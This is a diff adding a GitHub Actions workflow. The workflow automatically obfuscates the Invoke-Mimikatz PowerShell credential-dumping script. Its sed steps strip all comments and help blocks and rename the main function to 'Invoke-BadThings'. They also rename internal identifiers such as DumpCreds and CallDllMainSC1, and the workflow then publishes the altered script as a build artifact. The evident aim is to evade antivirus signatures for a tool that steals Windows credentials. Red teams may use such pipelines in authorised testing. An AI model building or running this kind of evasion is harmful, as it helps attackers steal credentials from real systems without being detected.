@@ -1,0 +1,45 @@
+name: Customise Scripts
+
+on: 
+  push:
+    branches: [ main, master ]
+  pull_request:
+    # The branches below must be a subset of the branches above
+    branches: [ main, master ]
+  workflow_dispatch:
+    inputs:
+      save:
+        type: boolean
+        description: 'Save executables'
+        required: true
+
+jobs:
+  scripts:
+    name: Customise Scripts
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout https://github.com/${{ github.repository }}@${{ github.ref }}
+        uses: actions/checkout@v2
+        with:
+          persist-credentials: false
+
+      - name: Customise Invoke-Mimikatz
+        run: |
+          export mimi="Exfiltration/Invoke-Mimikatz.ps1"
+          sed -i -e 's/Invoke-Mimikatz/Invoke-BadThings/g' $mimi
+          sed -i -e '/<#/,/#>/c\\' $mimi
+          sed -i -e 's/^[[:space:]]*#.*$//g' $mimi
+          sed -i -e 's/DumpCreds/DumpCred/g' $mimi
+          sed -i -e 's/ArgumentPtr/PullLemons/g' $mimi
+          sed -i -e 's/CallDllMainSC1/EggHunter/g' $mimi
+          sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" $mimi
+          mv $mimi .\Invoke-BadThings.ps1
+
+      - name: Store exe in artifact storage
+        # if: github.event.inputs.save
+        if: ${{ github.event_name != 'pull_request' }}
+        uses: actions/upload-artifact@v3
+        with:
+          name: custom-scripts
+          path: Invoke-BadThings.ps1
